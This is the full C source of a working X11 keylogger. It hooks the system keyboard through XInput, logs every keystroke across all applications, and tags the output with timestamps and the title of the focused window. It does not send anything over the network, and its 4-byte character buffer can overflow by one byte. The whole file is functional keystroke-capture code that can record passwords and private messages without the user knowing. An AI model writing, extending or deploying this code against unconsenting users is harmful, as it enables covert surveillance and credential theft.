#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <assert.h>
#include <X11/Xlib.h>
#include <X11/XKBlib.h>
#include <X11/extensions/XInput.h>

#define XK_MISCELLANY
#include <X11/keysymdef.h>

#define SEPARATOR_PREFIX ">>>"

#define VISUAL_BACKSPACE "\u232b"
#define VISUAL_DELETE "\u2326"
#define VISUAL_LEFT "\u2190"
#define VISUAL_UP "\u2191"
#define VISUAL_RIGHT "\u2192"
#define VISUAL_DOWN "\u2193"

static char *NO_TITLE = "(no title)";
static char *NO_ACTIVE_WINDOW = "(no active window)";

struct keystroke_info
{
    time_t timestamp;
    unsigned int original_keycode;
    KeySym original_keysym;
    unsigned int modifier_mask;
    int translation_available;
    KeySym translated_keysym;
    char translated_char[ 4 ];
    Window *focused_window;
    char* focused_window_name;
};

#ifndef DEBUG
static void process_event( const struct keystroke_info *info )
{
    static char *current = NULL;
    char time_buf[ 22 ];
    const char *out;

    /* overload some special keystrokes */
    switch ( info->original_keysym )
    {
    case XK_Return:
    case XK_KP_Enter:
        out = "\n";
        break;

    case XK_BackSpace:
        out = VISUAL_BACKSPACE;
        break;

    case XK_Delete:
        out = VISUAL_DELETE;
        break;

    case XK_Left:
    case XK_KP_Left:
        out = VISUAL_LEFT;
        break;

     case XK_Up:
     case XK_KP_Up:
         out = VISUAL_UP;
        break;

    case XK_Right:
    case XK_KP_Right:
        out = VISUAL_RIGHT;
        break;

     case XK_Down:
     case XK_KP_Down:
         out = VISUAL_DOWN;
        break;

    default:
        /* use default translation skipping control characters that are not
           associated to graphocal glyphs */
        if ( info->translation_available &&
             !( info->modifier_mask & ControlMask ) &&
             !( info->modifier_mask & Mod1Mask ) &&
             !( info->modifier_mask & Mod4Mask ) &&
             info->original_keysym != XK_Escape )
        {
            out = info->translated_char;
        }
        /* skip */
        else return;
    }

    /* notify change of focus with timestamp (use title instead of window id to
       deal with "tabbed" apps like Chrome) */
    if ( !current || strcmp( current , info->focused_window_name ) != 0 )
    {
        free( current );
        current = strdup( info->focused_window_name );

        /* format timestamp */
        strftime( time_buf , 22 , "%d/%m/%Y @ %H:%M:%S" ,
                  localtime( &info->timestamp ) );

        printf( "\n" SEPARATOR_PREFIX " %s : %s\n" , time_buf ,
                info->focused_window_name );
    }

    printf( "%s" , out );
    fflush( stdout );
}
#else
static void process_event( const struct keystroke_info *info )
{
    char time_buf[ 20 ];

    /* format timestamp */
    strftime( time_buf , 20 , "%d/%m/%Y %H:%M:%S" ,
              localtime( &info->timestamp ) );

    /* dump keystroke info */
    printf( "%s %c %c %c %c %c %c %c %i %s" ,
            time_buf ,
            info->modifier_mask & ShiftMask ? 'S' : 's' ,
            info->modifier_mask & LockMask ? 'L' : 'l' ,
            info->modifier_mask & ControlMask ? 'C' : 'c' ,
            info->modifier_mask & Mod1Mask ? 'A' : 'a' , /* alt */
            info->modifier_mask & Mod2Mask ? 'N' : 'n' , /* num lock */
            info->modifier_mask & Mod4Mask ? 'W' : 'w' , /* windows */
            info->modifier_mask & Mod5Mask ? 'G' : 'g' , /* alt gr */
            info->original_keycode ,
            XKeysymToString( info->original_keysym ) );

    /* dump translate keystroke (if available) */
    if ( info->translation_available )
    {
        printf( " %s %s" ,
                XKeysymToString( info->translated_keysym ) ,
                info->translated_char );
    }

    /* dump window name */
    printf( " 0x%lx \"%s\"" , info->focused_window , info->focused_window_name );

    printf( "\n" );
    fflush( stdout );
}
#endif

static int get_keybord_id( Display *display , XID *xid )
{
    int i , n;
    XDeviceInfo *devices;

    /* get all input devices */
    devices = XListInputDevices( display , &n );

    for ( i = 0 , *xid = 0 ; i < n ; i++ )
    {
        /* tries to guess the real ketboard */
        if ( strcmp( devices[i].name , "AT Translated Set 2 keyboard" ) == 0 )
        {
            *xid = devices[i].id;
            break;
        }
    }

    XFreeDeviceList( devices );
    return i != n;
}

static XIC get_input_context( Display *display )
{
    int i;
    XIM xim;
    XIMStyles *xim_styles;
    XIMStyle xim_style;
    XIC xic;

    /* open input method */
    assert( xim = XOpenIM( display , NULL , NULL , NULL ) );

    /* fetch styles  */
    assert( !XGetIMValues( xim , XNQueryInputStyle , &xim_styles , NULL ) );
    assert( xim_styles != NULL );

    /* search wanted style */
    for ( xim_style = 0 , i = 0 ; i < xim_styles->count_styles ; i++ )
    {
        if ( xim_styles->supported_styles[ i ] ==
             ( XIMPreeditNothing | XIMStatusNothing ) )
        {
            xim_style = xim_styles->supported_styles[ i ];
            break;
        }
    }
    assert( xim_style != 0 );

    /* create input context */
    assert( xic = XCreateIC( xim , XNInputStyle , xim_style , NULL ) );

    XFree( xim_styles );
    return xic;
}

int translate_device_key_event( XIC xic , XDeviceKeyEvent *event ,
                                KeySym *out_keysym , char *out_string )
{
    XDeviceKeyEvent *device_key_event;
    XKeyEvent key_event;
    Status status;
    int length;

    /* build associated key event */
    device_key_event = ( XDeviceKeyEvent * )event;
    key_event.type = KeyPress;
    key_event.serial = device_key_event->serial;
    key_event.send_event= device_key_event->send_event;
    key_event.display = device_key_event->display;
    key_event.window = device_key_event->window;
    key_event.root = device_key_event->root;
    key_event.subwindow = device_key_event->subwindow;
    key_event.time = device_key_event->time;
    key_event.state = device_key_event->state;
    key_event.keycode = device_key_event->keycode;
    key_event.same_screen = device_key_event->same_screen;

    /* translate the keystroke */
    length = XmbLookupString( xic , &key_event , out_string , 4 ,
                              out_keysym , &status );
    if ( status == XLookupBoth )
    {
        out_string[ length ] = '\0';
        return 1;
    }

    return 0;
}

int get_window_property( Display *display , Window window , const char *name , const char *type , void *data )
{
    Atom name_atom;
    Atom type_atom;
    Atom actual_type;
    int format , status;
    unsigned long n_items , after;

    /* get atoms */
    name_atom = XInternAtom( display , name , True );
    type_atom = XInternAtom( display , type , True );

    /* get window property */
    status = XGetWindowProperty( display , window , name_atom , 0 , 0xffff , False ,
                                 type_atom , &actual_type , &format ,
                                 &n_items , &after , ( unsigned char ** )data );

    return status == Success;
}

int get_window_name( Display *display , Window window , char **name )
{
    if ( window )
    {
        int ret;

        ret = get_window_property( display , window ,
                                   "_NET_WM_NAME" , "UTF8_STRING" , name );

        if ( ret && !*name ) *name = NO_TITLE;
        return ret;
    }
    /* e.g. no windows on the root */
    else
    {
        *name = NO_ACTIVE_WINDOW;
        return 1;
    }
}

int get_current_window( Display *display , Window **window )
{
    Window root;

    root = DefaultRootWindow( display );
    return get_window_property( display , root ,
                                "_NET_ACTIVE_WINDOW" , "WINDOW" , window );
}

int main( int argc , char *argv[] )
{
    int KEY_PRESS_TYPE;
    Display *display;
    int screen;
    Window root;
    XID keyboard_id;
    XDevice *device;
    XEventClass event_class;
    XIC xic;

    /* open display */
    if ( display = XOpenDisplay( NULL ) , !display )
    {
        fprintf( stderr , "Cannot open display" );
        return EXIT_FAILURE;
    }

    /* get variables */
    screen = DefaultScreen( display );
    root = RootWindow( display , screen );

    /* lookup the keyboard */
    if ( !get_keybord_id( display , &keyboard_id ) )
    {
        fprintf( stderr , "No keyboards found" );
        return EXIT_FAILURE;
    }

    /* open device */
    if ( device = XOpenDevice( display , keyboard_id ), !device )
    {
        fprintf( stderr , "Cannot open device" );
        return EXIT_FAILURE;
    }

    /* get input context */
    xic = get_input_context( display );

    /* register events */
    DeviceKeyPress( device , KEY_PRESS_TYPE , event_class );
    XSelectExtensionEvent( display , root , &event_class , 1 );

    /* event loop */
    while ( 1 )
    {
        XEvent event;
        XDeviceKeyEvent *device_event;
        struct keystroke_info info;

        /* wait for the next event */
        XNextEvent( display , &event );

        /* fill keystroke info */
        device_event = ( XDeviceKeyEvent * )&event;
        info.timestamp = time( NULL );
        info.original_keycode = device_event->keycode;
        info.original_keysym =
            XkbKeycodeToKeysym( display , device_event->keycode , 0 , 0 );
        info.modifier_mask = device_event->state;
        get_current_window( display , &info.focused_window );
        get_window_name( display , *info.focused_window , &info.focused_window_name );

        /* translate keystroke */
        info.translation_available =
            translate_device_key_event( xic ,
                                        device_event ,
                                        &info.translated_keysym ,
                                        info.translated_char );

        /* process the event */
        process_event( &info );

        /* cleanup */
        XFree( info.focused_window );
        if ( info.focused_window_name != NO_TITLE &&
             info.focused_window_name != NO_ACTIVE_WINDOW )
        {
            XFree( info.focused_window_name );
        }
    }
}
